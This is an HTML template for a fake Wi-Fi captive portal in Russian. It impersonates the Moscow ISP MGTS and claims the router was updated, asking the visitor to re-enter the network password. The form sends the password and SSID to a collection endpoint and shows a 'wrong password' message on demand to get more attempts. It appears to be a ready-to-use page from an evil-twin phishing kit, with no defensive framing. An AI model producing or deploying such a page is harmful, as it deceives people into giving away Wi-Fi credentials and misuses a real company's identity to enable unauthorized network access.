<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>МГТС — Домашний интернет</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f2f4f8;font-family:Arial,Helvetica,sans-serif;min-height:100vh}
.hdr{background:#003087;padding:14px 20px;display:flex;align-items:center;gap:12px}
.hdr-logo{color:#fff;font-size:26px;font-weight:900;letter-spacing:-1px;line-height:1}
.hdr-logo span{color:#e63329;font-size:11px;display:block;font-weight:400;letter-spacing:2px;margin-top:1px}
.hdr-right{margin-left:auto;color:rgba(255,255,255,.6);font-size:11px;text-align:right}
.banner{background:linear-gradient(135deg,#003087 0%,#0052cc 100%);padding:28px 20px 48px;color:#fff}
.banner h1{font-size:19px;font-weight:700;margin-bottom:8px}
.banner p{font-size:13px;opacity:.85;line-height:1.6;max-width:340px}
.ssid-pill{display:inline-block;background:rgba(255,255,255,.18);border-radius:20px;padding:3px 12px;font-size:12px;margin-top:8px;font-weight:600;letter-spacing:.3px}
.wrap{max-width:420px;margin:-20px auto 0;padding:0 16px 40px;position:relative;z-index:1}
.card{background:#fff;border-radius:10px;padding:24px;box-shadow:0 2px 20px rgba(0,0,80,.1)}
.card h2{font-size:15px;color:#003087;font-weight:700;margin-bottom:18px}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:#555;margin-bottom:5px;font-weight:600;letter-spacing:.3px}
input[type=text],input[type=password]{width:100%;padding:11px 13px;border:1.5px solid #dde3ef;border-radius:7px;font-size:14px;color:#222;background:#fafbfd;outline:none;-webkit-appearance:none}
input[type=text]:focus,input[type=password]:focus{border-color:#003087;background:#fff}
input[readonly]{background:#f0f3f9;color:#6b7280}
.btn{width:100%;padding:13px;background:#003087;color:#fff;border:none;border-radius:7px;font-size:15px;font-weight:700;cursor:pointer;margin-top:6px;-webkit-appearance:none;position:relative}
.btn:active{background:#002570}
.spin{display:none;position:absolute;right:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
.error{display:none;background:#fff0f0;border:1px solid #ffcccc;border-radius:6px;padding:10px 12px;font-size:12px;color:#c0392b;margin-top:10px}
.footer{text-align:center;margin-top:16px;font-size:11px;color:#aaa;line-height:1.6}
.accent{color:#e63329;font-weight:700}
</style>
</head>
<body>
<div class="hdr">
  <div class="hdr-logo">мгтс<span>ДОМАШНИЙ ИНТЕРНЕТ</span></div>
  <div class="hdr-right">Техническая<br>поддержка</div>
</div>
<div class="banner">
  <h1>Восстановление подключения</h1>
  <p>Роутер был обновлён. Введите пароль сети для восстановления доступа к интернету.</p>
  <div class="ssid-pill">&#128246; {{SSID}}</div>
</div>
<div class="wrap">
  <div class="card">
    <h2>Подтверждение пароля Wi-Fi</h2>
    <form method="POST" action="/api/portal/submit" id="frm">
      <input type="hidden" name="ssid" value="{{SSID}}">
      <input type="hidden" name="vendor" value="mgts">
      <div class="field">
        <label>Имя сети</label>
        <input type="text" value="{{SSID}}" readonly>
      </div>
      <div class="field">
        <label>Пароль Wi-Fi</label>
        <input type="password" name="password" placeholder="Введите пароль сети" required autocomplete="off" minlength="8">
      </div>
      <button type="submit" class="btn" id="sbtn">
        Подключиться
        <div class="spin" id="sp"></div>
      </button>
    </form>
    <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
  </div>
  <div class="footer">ПАО «МГТС» — Московская городская телефонная сеть<br><span class="accent">mgts.ru</span></div>
</div>
<script>
document.getElementById('frm').addEventListener('submit',function(){
  document.getElementById('sp').style.display='block';
  document.getElementById('sbtn').disabled=true;
});
var e=new URLSearchParams(location.search).get('err');
if(e){document.getElementById('err').style.display='block';}
</script>
</body>
</html>
